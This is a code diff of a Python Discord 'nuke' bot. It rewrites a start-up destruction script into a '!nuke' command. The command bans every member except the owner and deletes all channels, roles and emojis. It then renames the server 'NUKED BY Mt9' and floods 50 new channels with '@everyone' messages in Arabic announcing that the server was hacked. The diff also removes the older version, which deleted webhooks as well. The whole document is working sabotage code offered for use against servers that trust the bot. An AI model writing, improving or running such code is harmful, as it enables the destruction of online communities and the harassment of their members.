@@ -1,79 +1,63 @@
 import os
+import discord
 import requests
 import time
 import threading
 from flask import Flask
+from discord.ext import commands
 
 app = Flask(__name__)
-
 @app.route('/')
-def home():
-    return "Bot is running!"
-
-def run_web_server():
-    port = int(os.environ.get('PORT', 8080))
-    app.run(host='0.0.0.0', port=port)
+def home(): return "Bot is running!"
 
 TOKEN = os.getenv("BOT_TOKEN")
-GUILD_ID = os.getenv("GUILD_ID")
 BASE_URL = "https://discord.com/api/v9"
 HEADERS = {"Authorization": f"Bot {TOKEN}", "Content-Type": "application/json"}
+
+intents = discord.Intents.default()
+intents.message_content = True
+intents.members = True
+bot = commands.Bot(command_prefix="!", intents=intents)
 
 def send_request(method, url, json=None):
     while True:
         r = method(url, headers=HEADERS, json=json)
         if r.status_code == 429:
-            retry_after = r.json().get("retry_after", 1)
-            time.sleep(retry_after)
-        else:
-            return r
+            time.sleep(r.json().get("retry_after", 1))
+        else: return r
 
-def nuke_operations():
-    def delete_channels():
-        r = requests.get(f"{BASE_URL}/guilds/{GUILD_ID}/channels", headers=HEADERS)
-        if r.status_code == 200:
-            for ch in r.json():
-                send_request(requests.delete, f"{BASE_URL}/channels/{ch['id']}")
+@bot.command()
+async def nuke(ctx):
+    guild = ctx.guild
+    
+    for member in guild.members:
+        if member.id != bot.user.id and member.id != guild.owner_id:
+            try: await member.ban(reason="NUKED BY Mt9")
+            except: pass
 
-    def delete_roles():
-        r = requests.get(f"{BASE_URL}/guilds/{GUILD_ID}/roles", headers=HEADERS)
-        if r.status_code == 200:
-            for role in r.json():
-                if role['name'] != "@everyone" and not role['managed']:
-                    send_request(requests.delete, f"{BASE_URL}/guilds/{GUILD_ID}/roles/{role['id']}")
+    channels = requests.get(f"{BASE_URL}/guilds/{guild.id}/channels", headers=HEADERS).json()
+    for ch in channels:
+        send_request(requests.delete, f"{BASE_URL}/channels/{ch['id']}")
+    
+    roles = requests.get(f"{BASE_URL}/guilds/{guild.id}/roles", headers=HEADERS).json()
+    for role in roles:
+        if role['name'] != "@everyone" and not role['managed']:
+            send_request(requests.delete, f"{BASE_URL}/guilds/{guild.id}/roles/{role['id']}")
+            
+    emojis = requests.get(f"{BASE_URL}/guilds/{guild.id}/emojis", headers=HEADERS).json()
+    for e in emojis:
+        send_request(requests.delete, f"{BASE_URL}/guilds/{guild.id}/emojis/{e['id']}")
 
-    def delete_emojis():
-        r = requests.get(f"{BASE_URL}/guilds/{GUILD_ID}/emojis", headers=HEADERS)
-        if r.status_code == 200:
-            for e in r.json():
-                send_request(requests.delete, f"{BASE_URL}/guilds/{GUILD_ID}/emojis/{e['id']}")
-
-    def delete_webhooks():
-        r = requests.get(f"{BASE_URL}/guilds/{GUILD_ID}/webhooks", headers=HEADERS)
-        if r.status_code == 200:
-            for w in r.json():
-                send_request(requests.delete, f"{BASE_URL}/webhooks/{w['id']}")
-
-    def mass_create_and_spam(count, name, msg):
-        for i in range(count):
-            res = send_request(requests.post, f"{BASE_URL}/guilds/{GUILD_ID}/channels", {"name": f"{name}-{i}", "type": 0})
-            if res.status_code == 201:
-                channel_id = res.json()['id']
-                for _ in range(3):
-                    send_request(requests.post, f"{BASE_URL}/channels/{channel_id}/messages", {"content": msg})
-
-    def change_name(new_name):
-        send_request(requests.patch, f"{BASE_URL}/guilds/{GUILD_ID}", {"name": new_name})
-
-    delete_channels()
-    delete_roles()
-    delete_emojis()
-    delete_webhooks()
-    change_name("NUKED BY FAKHAM")
-    mass_create_and_spam(50, "nuked", "@everyone تم التهكير من فخم")
+    send_request(requests.patch, f"{BASE_URL}/guilds/{guild.id}", {"name": "NUKED BY Mt9", "icon": None})
+    
+    for i in range(50):
+        res = send_request(requests.post, f"{BASE_URL}/guilds/{guild.id}/channels", {"name": f"nuked-{i}", "type": 0})
+        if res.status_code == 201:
+            ch_id = res.json()['id']
+            for _ in range(3):
+                send_request(requests.post, f"{BASE_URL}/channels/{ch_id}/messages", {"content": "@everyone تم التهكير من Mt9"})
 
 if __name__ == "__main__":
-    threading.Thread(target=run_web_server).start()
-    if TOKEN and GUILD_ID:
-        nuke_operations()
-        
+    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))).start()
+    bot.run(TOKEN)
+    
